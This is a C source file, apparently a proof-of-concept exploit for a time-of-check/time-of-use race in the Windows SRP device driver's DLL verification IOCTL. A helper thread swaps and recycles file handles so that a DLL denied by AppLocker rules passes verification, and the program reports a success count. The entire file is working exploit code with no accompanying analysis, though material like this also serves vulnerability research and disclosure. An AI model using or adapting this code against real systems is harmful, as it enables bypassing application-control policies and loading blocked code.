#include <windows.h>
#include <stdio.h>

#define IOCTL_SRP_VERIFY_DLL 0x225804

static volatile HANDLE g_hVictim = INVALID_HANDLE_VALUE;
static volatile LONG g_Go = 0, g_Stop = 0;

static HANDLE OpenRW(const WCHAR *p) {
    return CreateFileW(p, FILE_READ_DATA|FILE_READ_ATTRIBUTES|SYNCHRONIZE,
        FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, 0, NULL);
}

DWORD WINAPI Racer(LPVOID x) {
    HANDLE t[4]; int j;
    (void)x;
    while (!g_Stop) {
        if (!g_Go) { YieldProcessor(); continue; }
        HANDLE h = (HANDLE)InterlockedExchangePointer(
            (volatile PVOID *)&g_hVictim, INVALID_HANDLE_VALUE);
        if (h != INVALID_HANDLE_VALUE) {
            CloseHandle(h);
            for (j=0;j<4;j++) t[j]=OpenRW(L"C:\\Windows\\System32\\kernel32.dll");
            for (j=0;j<4;j++) if(t[j]!=INVALID_HANDLE_VALUE) CloseHandle(t[j]);
        }
        InterlockedExchange(&g_Go, 0);
        while (!g_Stop && !g_Go) YieldProcessor();
    }
    return 0;
}

int main(void) {
    WCHAR blocked[MAX_PATH], tmp[MAX_PATH];
    HANDLE hDev, hThread, hFile;
    DWORD sz, ret, retd;
    BYTE *buf;
    USHORT pathBytes;
    int i, allowed=0, denied=0, err=0;

    hDev = CreateFileW(L"\\\\.\\SrpDevice", FILE_READ_DATA,
        FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDev == INVALID_HANDLE_VALUE) {
        printf("[-] SrpDevice: %lu\n", GetLastError());
        return 1;
    }

    GetTempPathW(MAX_PATH, tmp);
    _snwprintf(blocked, MAX_PATH, L"%spoc.dll", tmp);
    CopyFileW(L"C:\\Windows\\System32\\ntdll.dll", blocked, FALSE);

    pathBytes = (USHORT)(wcslen(blocked) * 2);
    sz = 10 + pathBytes;
    buf = calloc(1, sz);

    hFile = OpenRW(blocked);
    *(HANDLE*)buf = hFile;
    *(USHORT*)(buf + 8) = pathBytes;
    memcpy(buf + 10, blocked, pathBytes);

    ret = 0;
    DeviceIoControl(hDev, IOCTL_SRP_VERIFY_DLL, buf, sz, &ret, 4, &retd, NULL);
    printf("Baseline: 0x%08lx (%s)\n", ret, ret ? "DENIED" : "ALLOWED");
    CloseHandle(hFile);

    if (!ret) {
        printf("DLL not denied - configure AppLocker DLL rules\n");
        return 1;
    }

    hThread = CreateThread(NULL, 0, Racer, NULL, 0, NULL);

    for (i = 0; i < 5000; i++) {
        hFile = OpenRW(blocked);
        if (hFile == INVALID_HANDLE_VALUE) continue;

        *(HANDLE*)buf = hFile;
        InterlockedExchangePointer((volatile PVOID*)&g_hVictim, hFile);
        InterlockedExchange(&g_Go, 1);

        ret = 0;
        if (DeviceIoControl(hDev, IOCTL_SRP_VERIFY_DLL, buf, sz, &ret, 4, &retd, NULL)) {
            if (!ret) allowed++;
            else denied++;
        } else err++;

        HANDLE left = (HANDLE)InterlockedExchangePointer(
            (volatile PVOID*)&g_hVictim, INVALID_HANDLE_VALUE);
        if (left != INVALID_HANDLE_VALUE) CloseHandle(left);

        InterlockedExchange(&g_Go, 0);
    }

    InterlockedExchange(&g_Stop, 1);
    InterlockedExchange(&g_Go, 1);
    WaitForSingleObject(hThread, 3000);

    printf("Race: %d allowed / %d denied / %d error (5000 iterations)\n", allowed, denied, err);
    if (allowed) printf("TOCTOU CONFIRMED: denied DLL passed verification %d times\n", allowed);

    DeleteFileW(blocked);
    free(buf);
    CloseHandle(hDev);
    return 0;
}
